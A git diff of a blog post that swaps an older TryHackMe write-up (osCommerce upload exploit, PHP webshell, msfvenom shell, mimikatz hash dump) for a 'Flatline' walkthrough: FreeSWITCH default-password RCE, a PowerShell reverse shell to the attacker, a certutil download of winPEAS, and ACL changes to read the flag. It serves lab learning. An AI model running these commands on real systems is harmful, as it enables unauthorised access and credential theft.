@@ -1,197 +1,278 @@
 ---
 weight: 3
 title: "CTF writeup - Flatline"
-date: 2022-08-26T14:57:40+08:00
-lastmod: 2022-08-61T15:00:40+08:00
-description: "This is my second TryHackMe writeup"
+date: 2022-08-28T22:15:40+08:00
+lastmod: 2022-08-28T22:16:40+08:00
+description: "Another late night CTF on the awesome platform TryHackMe"
 
 title: CTF writeup - Flatline
 featuredImage: tryhackmebanner.jpg
 hiddenfeaturedImage: true
 
-tags: ["TryHackMe", "CTF"]
+tags: ["TryHackMe", "CTF", "Windows"]
 categories: ["Writeups"]
 
 lightgallery: false
-summary: The tags on this box tells us that it involves SQLi, RCE and enumeration.
+summary: The tags on this box tells us that it involves Windows, privesc, RCE and enumeration.
 ---
 
 # {{< figure src="/flatline/TryHackMe_Flatline.png" title="How low are your morals? Hack this box to find out!" >}}
 
-## Summary
+# Summary
 
-1. Recon with nmap & Enumerate the services. SMB on port 139 and 445, HTTP-Proxy on port 8080 and HTTPS on port 443.
-2. The HTTP service on port 8080 has directory listing and hosts an e-commerce app. 
-3. Initial foothold by exploiting a known misconfiguration in the oscommerce application which lets us create an authenticated user.
-4. With the authenticated user we exploit a known vulnerability in the app which gives us Arbitrary File Upload.
-5. Upload a PHP script which gives us Remote Code Execution through PHP passthru.
-6. Create and upload a payload with a reverse Windows TCP/IP shell.
-7. We catch the shell, enumerating further and upload mimikatz to the target machine.
-8. Dump the hashes, crack the hashes.
-9. Read root.txt and get our last flag to complete the room.
+1. Initial scanning with NMAP TCP and no-ping to the Windows Server 2019 host.
+2. Service fingerprinting with NMAP banner grabbing shows us RDP on port 3389 and Freeswitch service on port 8021.
+3. Google OSINT reveals that the service on port 8021 comes pre-packaged with default credentials.
+4. Exploit-DB gives us an easy to use Python script with Remote Code Exploitation that let’s us authenticate with the known password and send commands to PowerShell on the host.
+5. We abuse the above to spawn a reverse netcat shell session which gives us the first user.txt flag.
+6. Once inside the system we conduct further enumeration which reveals that we can abuse our local group privileges and change file permissions to fetch our final flag.
 
-## Recon & Scanning
+# Scanning & Enumeration
 
-We start with our usual nmap scan:
+## NMAP
 
-nmap -sV -sC -A -T4 -p- 10.10.13.10
-
-{{< figure src="/blueprint/nmap.jpg" title="" >}}
-
-We immidietaly discover some ports that quickly tells us this is a Windows machine with some services worth investigating.
-
-1. Port 80 - Reveals a webserver which leads us to a default “page not found” webpage.
-2. Port 445 - Which is SMB running on top of TCP
-3. Port 3306 - Which is the default port for the classic MySQL service
-4. Port 139 - Which is the old SMB that runs on top of NetBIOS.
-5. Port 443 - The standard port for Secure HTTP. This leads us to a directory listing.
-6. Port 8080 - Apache Webserver with OpenSSL and PHP
-
-## Enumeration
-
-So, our first step will be to look at the SMB shares using enum4linux and smbclient.
-(Nothing interesting to reveal here, so we move on..)
-
-Let's go ahead and visit the web service on port 443:
-
-{{< figure src="/blueprint/directorylisting.jpg" title="" >}}
-
-Interesting...a directory listing with some sort of e-commerce app. We can also see that the server is running Apache with OpenSSL and PHP, with even the version info disclosed.
-
-We can enumerate further and try directory brute forcing with dirsearch:
+Let’s start with a basic Nmap scan. Since this is a Windows host which has a firewall enabled, it does not respond to ping requests.
 
 ```bash
-python3 dirsearch.py -u http://10.10.13.10:8080/oscommerce-2.3.4/ -e php,cgi,html,txt,exe -x 400,401,403 -r -R 3 -t 100
+┌──(kali㉿kali)-[~]
+└─$ nmap -Pn $IP
+Starting Nmap 7.92 ( [https://nmap.org](https://nmap.org/) ) at 2022-08-27 13:30 EDT
+Nmap scan report for 10.10.83.229
+Host is up (0.058s latency).
+Not shown: 998 filtered tcp ports (no-response)
+PORT     STATE SERVICE
+3389/tcp open  ms-wbt-server
+8021/tcp open  ftp-proxy
+
+Nmap done: 1 IP address (1 host up) scanned in 6.81 seconds
 ```
 
-{{< figure src="/blueprint/dirsearch1.jpg" title="" >}}
+### Service fingerprinting
 
-Results! We found some interesting paths; ADMIN and INSTALL.
-
-{{< figure src="/blueprint/dirsearch_result.jpg" title="" >}}
-
-Browsing to the INSTALL page, we find this strange site Welcome to osCommerce Online Merchant v2.3.4!
-It wants us to start an installation...
-
-{{< figure src="/blueprint/oscommerce_install.jpg" title="" >}}
-
-So without tampering anymore with the installation page, we have to find out some more info on this and see if theres a possible exploit.
-A quick “searchsploit” in Kali terminal tells us that this might have a vulnerability.
-
-{{< figure src="/blueprint/searchsploit.jpg" title="" >}}
-
-The ones that stand out to me are “Arbitrary File Upload” and “Remote Code Execution”. This can perhaps get us a shell and initial access.
-Let's check it out!
-
-Copying the python script to our working directory:
-{{< figure src="/blueprint/pythonscript1.jpg" title="" >}}
-
-After looking through the python script for the “Arbitrary File Upload”, I can see that theres a method for an AUTHENTICATED user to exploit this succesfully . We should probably go back to the installation page and create an authenticated user before going further...
-{{< figure src="/blueprint/pythonscript2.jpg" title="" >}}
-
-## Exploitation
-
-#### Back to the /install/ page we create a new user: 
-
-{{< figure src="/blueprint/oscommerce_install2.jpg" title="" >}}
-
-After the process is done, we see this page:
-
-{{< figure src="/blueprint/oscommerce_install3.jpg" title="" >}}
-
-We now have completed the process and created an authenticated user. We can try to upload something now with the Arbitrary File Upload exploit.
-We could try a simple php script that works with native PHP:
-
-{{< figure src="/blueprint/php_passthru.jpg" title="" >}}
-
-Explanation from PHP.net:
-
->    exec() is for calling a system command, and perhaps dealing with the output yourself.
->    system() is for executing a system command and immediately displaying the output - presumably text.
->    passthru() is for executing a system command which you wish the raw return from - presumably something binary.
-
-So basically this will let us do RCE through our browser adress bar. Pretty cool!
-
-{{< figure src="/blueprint/shell.jpg" title="" >}}
+The service scan shows us that **RDP** is running and a “**Freeswitch**” service. It also tells us that the hostname for this machine is **WIN-EOM4PK0578N**.
 
 ```bash
-python 43191.py -u http://10.10.248.2:8080/oscommerce-2.3.4/ --auth=admin:admin -f shell.php
+┌──(kali㉿kali)-[~]
+└─$ nmap -Pn -T5 -A -p 3389,8021 $IP
+Starting Nmap 7.92 ( [https://nmap.org](https://nmap.org/) ) at 2022-08-27 13:36 EDT
+Nmap scan report for 10.10.83.229
+Host is up (0.061s latency).
+
+PORT     STATE SERVICE            VERSION
+3389/tcp open  ssl/ms-wbt-server?
+| rdp-ntlm-info:
+|   Target_Name: WIN-EOM4PK0578N
+|   NetBIOS_Domain_Name: WIN-EOM4PK0578N
+|   NetBIOS_Computer_Name: WIN-EOM4PK0578N
+|   DNS_Domain_Name: WIN-EOM4PK0578N
+|   DNS_Computer_Name: WIN-EOM4PK0578N
+|   Product_Version: 10.0.17763
+|_  System_Time: 2022-08-27T17:38:08+00:00
+|_ssl-date: 2022-08-27T17:38:10+00:00; +1s from scanner time.
+| ssl-cert: Subject: commonName=WIN-EOM4PK0578N
+| Not valid before: 2022-08-26T17:28:56
+|_Not valid after:  2023-02-25T17:28:56
+8021/tcp open  freeswitch-event   FreeSWITCH mod_event_socket
+
+Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .
+Nmap done: 1 IP address (1 host up) scanned in 108.09 seconds
 ```
 
-The command is successful. Lets try to browse to the provided link and execute commands!
+### Banner grabbing
 
-{{< figure src="/blueprint/browser_rce.jpg" title="" >}}
-<!--/shell.php?cmd=whoami-->
-
-So we now have managed to upload a file AND we can also perform Remote Code Execution on the system. Because we are a system user, we also have the HIGHEST privileges on the local system. Awesome! =)
-
-From Microsoft.com:
-*“The account NT AUTHORITY\System which is a Local System account.. It is a powerful account that has unrestricted access to all local system resources. It is a member of the Windows Administrators group on the local computer, and is therefore a member of the SQL Server sysadmin fixed server role.”*
-
-This immediately gives me an idea; Lets create an msfvenom payload for Windows with a reverse shell and upload it just like we did with the shell.php file.
-
-{{< figure src="/blueprint/msfvenom.jpg" title="" >}}
-
-So you can see here that all it took was 2 simple commands with the right parameters.
-All we need to do next is to catch the reverse shell connection with a netcat listener.
-
-We start our listener to prepare for our newly uploaded shell:
+This shows us that the FreeSWITCH service is running with some “mod_event_socket” that apparently accepts a login (authentication request).
 
 ```bash
-nc -lvnp 9999
+┌──(kali㉿kali)-[~]
+└─$ nmap -sV -Pn --script=banner -p 8021 $IP
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-27 13:54 EDT
+Nmap scan report for 10.10.83.229
+Host is up (0.063s latency).
+
+PORT     STATE SERVICE          VERSION
+8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
+|_banner: Content-Type: auth/request
 ```
 
-And then browse to http://10.10.248.2:8080/oscommerce-2.3.4/catalog/admin/shell.php?cmd=shell
+### Google OSINT
 
-{{< figure src="/blueprint/netcat.jpg" title="" >}}
+A quick Google search for “freeswitch mod_event_socket” shows us a confluence documentation which reveals that this service runs with some default settings on the port 8021 and password “ClueCon”.
 
-We have a windows CMD shell! 
-Our tasks wants us to get the hash of the first user.
+{{< figure src="/flatline/freeswitch_creds.png" title="The Freeswitch service documentation" >}}
 
-This makes me think of Mimikatz, a tool that is used to grab hashes.
-Now that we can upload files, lets upload Mimikatz. We also need to know which architecture of windows that is running with a simple “systeminfo”
+# Exploitation
 
-{{< figure src="/blueprint/systeminfo.jpg" title="" >}}
-<!--systeminfo shows x86-based PC architecture-->
-
-Copying the mimikatz binary to our working directory and preparing for upload:
-{{< figure src="/blueprint/copy_katz.jpg" title="" >}}
+Searching for this with Searchsploit gives us TWO command execution exploits.
+One metasploit module and a python script.
 
 ```bash
-locate mimikatz_x86.exe
-cp /usr/share/responder/tools/MultiRelay/bin/mimikatz_x86.exe .
-ls
+┌──(kali㉿kali)-[~]
+└─$ searchsploit freeswitch
+---------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                        |  Path
+---------------------------------------------------------------------- ---------------------------------
+FreeSWITCH - Event Socket Command Execution (Metasploit)              | multiple/remote/47698.rb
+FreeSWITCH 1.10.1 - Command Execution                                 | windows/remote/47799.txt
+---------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
 ```
 
-AND we upload it just as we did before!
-{{< figure src="/blueprint/upload_katz.jpg" title="" >}}
+The metasploit module failed to create a session, so we’ll try to run the exploit written in python.
 
-We run "dir" back in the netcat session shell, and there it is! Mimikatz.exe.
-{{< figure src="/blueprint/dir.jpg" title="" >}}
+```python
+┌──(kali㉿kali)-[~]
+└─$ cat /usr/share/exploitdb/exploits/windows/remote/47799.txt
+# Exploit Title: FreeSWITCH 1.10.1 - Command Execution
+# Date: 2019-12-19
+# Exploit Author: 1F98D
+# Vendor Homepage: https://freeswitch.com/
+# Software Link: https://files.freeswitch.org/windows/installer/x64/FreeSWITCH-1.10.1-Release-x64.msi
+# Version: 1.10.1
+# Tested on: Windows 10 (x64)
+#
+# FreeSWITCH listens on port 8021 by default and will accept and run commands sent to
+# it after authenticating. By default commands are not accepted from remote hosts.
+#
+# -- Example --
+# root@kali:~# ./freeswitch-exploit.py 192.168.1.100 whoami
+# Authenticated
+# Content-Type: api/response
+# Content-Length: 20
+#
+# nt authority\system
+#
 
-## Dumping and cracking hashes
+#!/usr/bin/python3
+```
 
-NOW, its time to grab some hashes back in our pseudo-terminal!
+## Remote Code Execution
 
+Time to run our python script and see if we can execute a reverse shell to get commandline access on the machine.
 
-{{< figure src="/blueprint/hashdump.jpg" title="mimikatz_x86.exe; lsadump::sam" >}}
+First, we can see a POC that shows us command execution and that the service is running under the account “nekrotic”.
 
-We can proceed to crack the users NTLM hashes with JohnTheRipper or Hashcat, but lets try the easy and faster method first;
-Hello crackstation!
+```python
+┌──(kali㉿kali)-[~/tryhackme/flatline]
+└─$ python3 freeswitch_rce.py $IP whoami
+Authenticated
+Content-Type: api/response
+Content-Length: 25
 
-{{< figure src="/blueprint/crackstation.jpg" title="" >}}
+win-eom4pk0578n\nekrotic
+```
 
-The final task is to find the root.txt flag. We can do a quick search for this and use the MORE command to display the contents of the .txt file.
+### Reverse Shell
 
-{{< figure src="/blueprint/filesearch.jpg" title="" >}}
+Using the awesome tool [gimmeSH.sh](https://github.com/A3h1nt/gimmeSH) by **A3h1nt**, we can quickly generate a powershell reverse shell and execute it on the remote host.
+
+{{< figure src="/flatline/gimmesh.png" title="gimmeSH.sh shell generator" >}}
+
+```bash
+┌──(kali㉿kali)-[~/tryhackme/flatline]
+└─$ python3 freeswitch_rce.py $IP "$(cat powershell_rev.ps1)"                     
+Authenticated
+
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.14.6.6] from (UNKNOWN) [10.10.104.26] 49846
+whoami
+win-eom4pk0578n\nekrotic
+PS C:\Program Files\FreeSWITCH>
+```
+
+As we can see, we now have an interactive shell session. Time to find the first flag.
 
 ```powershell
-cd/
-where /r c:\ root*
-more c:\Users\Administrator\Desktop\root.txt.txt
+PS C:\users\Nekrotic\Desktop> type user.txt
+THM{64bca0843d535fa73eecdc59d27cbe26} 
+PS C:\users\Nekrotic\Desktop>
 ```
-And we found the last flag!
 
-##  Final Thoughts
+# Privilege Escalation
 
-Blueprint was a great learning opportunity for me. I could have made it much faster with just using Metasploit and a meterpreter session, but instead I chose to do it manually using the upload and RCE exploit and Mimikatz.
+We could do some quick enumeration of the host with WinPEAS (Windows Privilege Escalation Awesome Script). 
+
+First, we need to host it with a Python simple HTTP server. Then download our Winpeas binary with certutil from our running PS console session
+
+```bash
+┌──(kali㉿kali)-[~/winpeas]
+└─$ python3 -m http.server 8888
+Serving HTTP on 0.0.0.0 port 8888 ([http://0.0.0.0:8888/](http://0.0.0.0:8888/)) ...
+127.0.0.1 - - [28/Aug/2022 09:08:41] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [28/Aug/2022 09:08:41] code 404, message File not found
+127.0.0.1 - - [28/Aug/2022 09:08:41] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [28/Aug/2022 09:11:00] "GET / HTTP/1.1" 200 -
+```
+
+```powershell
+PS C:\Program Files\FreeSWITCH>certutil -urlcache -split -f [http://10.14.6.6:8888/](http://10.14.6.6:8888/winpeas.exe)winPEASx64_ofs.exe winPEAS-Obfuscated.exe
+```
+
+Unfortunately I could not get winpeas.exe to run properly. So we need to do some manual enumeration…
+
+## User Enumeration
+
+It looks like our current user is a member of the Local Group Administrators.
+Perhaps we could abuse this somehow…
+
+```powershell
+PS C:\users\nekrotic\desktop> net user nekrotic
+User name                    Nekrotic
+Full Name                    Nekrotic
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            09/11/2021 08:16:50
+Password expires             Never
+Password changeable          09/11/2021 08:16:50
+Password required            Yes
+User may change password     No
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   28/08/2022 14:06:28
+
+Logon hours allowed          All
+
+Local Group Memberships      *Administrators       *Users
+Global Group memberships     *None
+The command completed successfully.
+```
+
+## Changing File Permissions
+
+We can probably change the file permissions to be able to read the root.txt that is owned by the Administrator. We can do this with Get-Acl and Set-Acl in PowerShell.
+
+For example to copy the ACL from user.txt to root.txt use this:
+
+```powershell
+Get-Acl -Path "C:\users\nekrotic\desktop\user.txt" | Set-Acl -Path "C:\users\nekrotic\desktop\root.txt"
+```
+
+```powershell
+PS C:\users\nekrotic\desktop> get-acl root.txt | ft
+
+    Directory: C:\users\nekrotic\desktop
+
+Path     Owner                    Access                                                                               
+----     -----                    ------                                                                               
+root.txt WIN-EOM4PK0578N\Nekrotic NT AUTHORITY\SYSTEM Allow  FullControl...                                            
+
+PS C:\users\nekrotic\desktop> get-acl root.txt | ft;type root.txt
+
+    Directory: C:\users\nekrotic\desktop
+
+Path     Owner                    Access                                                                               
+----     -----                    ------                                                                               
+root.txt WIN-EOM4PK0578N\Nekrotic NT AUTHORITY\SYSTEM Allow  FullControl...                                            
+
+THM{8c8bc5558f0f3f8060d00ca231a9fb5e}
+```
+
+As we can see, we now succesfully changed the ownership of the file with PowerShell’s built in commands to modify and set the ACL list. This way, we just copied our current users “user.txt” file permissions over to the “root.txt” file. Pretty simple to get the final flag!
